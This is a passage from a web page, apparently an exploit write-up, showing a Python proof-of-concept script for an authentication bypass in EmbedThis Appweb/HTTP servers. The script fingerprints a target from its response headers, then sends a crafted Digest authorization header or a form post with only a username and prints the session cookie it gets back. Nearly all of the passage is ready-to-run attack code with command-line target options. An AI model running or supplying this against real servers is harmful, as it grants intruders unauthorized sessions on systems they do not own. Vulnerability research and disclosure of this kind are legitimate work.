+</span></span><span style=display:flex><span>    potential_auth <span style=color:#f92672>=</span> [(<span style=color:#e6db74>&#34;Last Modified&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>), (<span style=color:#e6db74>&#34;X-Frame-Options&#34;</span>, <span style=color:#e6db74>&#34;SAMEORIGIN&#34;</span>), (<span style=color:#e6db74>&#34;Accept-Ranges&#34;</span>, <span style=color:#e6db74>&#34;bytes&#34;</span>), (<span style=color:#e6db74>&#34;Content-Type&#34;</span>, <span style=color:#e6db74>&#34;text/html&#34;</span>)]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> r<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;WWW-Authenticate&#34;</span>) <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> k, v <span style=color:#f92672>in</span> auth:
+</span></span><span style=display:flex><span>        rv <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(k)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> rv:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> v <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span> <span style=color:#f92672>and</span> v <span style=color:#f92672>!=</span> rv:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    potential_count <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> k, v <span style=color:#f92672>in</span> potential_auth:
+</span></span><span style=display:flex><span>        rv <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(k)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> rv <span style=color:#f92672>and</span> v <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span> <span style=color:#f92672>and</span> v <span style=color:#f92672>==</span> rv:
+</span></span><span style=display:flex><span>            potential_count <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[+] Optional matchings: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(potential_count, len(potential_auth)))
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>test</span>(url):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34; Newer EmbedThis HTTP Library/Appweb versions do not advertise their presence in headers, sometimes might be proxied by nginx/apache, we can only look for a default headers configuration &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># EmbedThis GoAhead uses a similar headers configuration, let&#39;s skip it explicitly</span>
+</span></span><span style=display:flex><span>    serv <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;Server&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> serv <span style=color:#f92672>and</span> <span style=color:#e6db74>&#34;GoAhead&#34;</span> <span style=color:#f92672>in</span> serv:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> test_digest(r):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;digest&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> test_form(r):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;form&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(url, username<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;joshua&#34;</span>, authtype<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;digest&#34;</span>):
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;username&#34;</span>: username }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    headers <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;authorization&#34;</span>: <span style=color:#e6db74>&#34;Digest username=</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(username),
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;user-agent&#34;</span>: <span style=color:#e6db74>&#34;TruelBot&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;content-type&#34;</span>: <span style=color:#e6db74>&#34;application/x-www-form-urlencoded&#34;</span>,
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> authtype <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;digest&#34;</span>:
+</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, data<span style=color:#f92672>=</span>payload, headers<span style=color:#f92672>=</span>headers)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>payload, headers<span style=color:#f92672>=</span>headers)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    print(r<span style=color:#f92672>.</span>content)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>!=</span> <span style=color:#ae81ff>200</span> <span style=color:#f92672>or</span> len(r<span style=color:#f92672>.</span>cookies) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;[!] Exploit failed, HTTP status code </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(r<span style=color:#f92672>.</span>status_code))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Succesfully exploited, here&#39;s your c00kie:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>  </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(dict(r<span style=color:#f92672>.</span>cookies))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    parser <span style=color:#f92672>=</span> argparse<span style=color:#f92672>.</span>ArgumentParser(description<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Test&amp;Exploit EmbedThis form/digest authentication bypass (CVE-XXXX-YYYY)&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-t&#39;</span>, <span style=color:#e6db74>&#39;--target&#39;</span>, required<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;specify the target url (i.e., http(s)://target-url[:port]/)&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-u&#39;</span>, <span style=color:#e6db74>&#39;--user&#39;</span>, required<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;you need to know a valid user name&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-c&#39;</span>, <span style=color:#e6db74>&#39;--check&#39;</span>, action<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;store_true&#39;</span>, default<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;test for exploitability without running the actual exploit&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-f&#39;</span>, <span style=color:#e6db74>&#39;--force&#39;</span>, action<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;store_true&#39;</span>, default<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;skip exploitability test&#34;</span>)
+</span></span><span style=display:flex><span>    args <span style=color:#f92672>=</span> parser<span style=color:#f92672>.</span>parse_args()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>target
+</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>user
+</span></span><span style=display:flex><span>    t <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;form&#34;</span> <span style=color:#75715e># default will try form/post</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>check <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> args<span style=color:#f92672>.</span>force:
+</span></span><span style=display:flex><span>        t <span style=color:#f92672>=</span> test(url)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> t <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;[!] Target does not appear to be Appweb/Embedthis HTTP with form/post auth (force with -f)&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;[+] Potential appweb/embedthis http, </span><span style=color:#e6db74>{}</span><span style=color:#e6db74> method&#34;</span><span style=color:#f92672>.</span>format(t))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> args<span style=color:#f92672>.</span>check:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;[!] Exploiting </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>, user </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>!&#34;</span><span style=color:#f92672>.</span>format(url, username))
+</span></span><span style=display:flex><span>        exploit(url, username, t)
+</span></span></code></pre></div></article></main></div></body></html>
